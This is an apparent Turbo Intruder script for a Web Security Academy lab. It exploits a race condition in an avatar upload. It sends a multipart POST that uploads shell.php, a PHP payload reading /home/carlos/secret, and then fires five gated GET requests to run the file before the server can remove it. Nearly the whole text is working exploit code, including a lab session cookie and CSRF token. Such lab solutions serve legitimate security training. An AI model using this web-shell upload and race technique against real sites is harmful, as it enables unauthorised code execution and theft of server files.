def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0a88001303eb41bf829d01bf0069005b.web-security-academy.net
Cookie: session=I4N2xfgVc1IoPWJ3OqoHnLx3je2CRbFB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------99682082328213314392957149335
Content-Length: 540
Origin: https://0a88001303eb41bf829d01bf0069005b.web-security-academy.net
Referer: https://0a88001303eb41bf829d01bf0069005b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

-----------------------------99682082328213314392957149335
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------99682082328213314392957149335
Content-Disposition: form-data; name="user"

wiener
-----------------------------99682082328213314392957149335
Content-Disposition: form-data; name="csrf"

cspBQhmyCp8z5QEOMbmIdKojRMrgRWB4
-----------------------------99682082328213314392957149335--
'''

    request2 = '''GET /files/avatars/shell.php HTTP/2
Host: 0a88001303eb41bf829d01bf0069005b.web-security-academy.net
Cookie: session=I4N2xfgVc1IoPWJ3OqoHnLx3je2CRbFB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a88001303eb41bf829d01bf0069005b.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
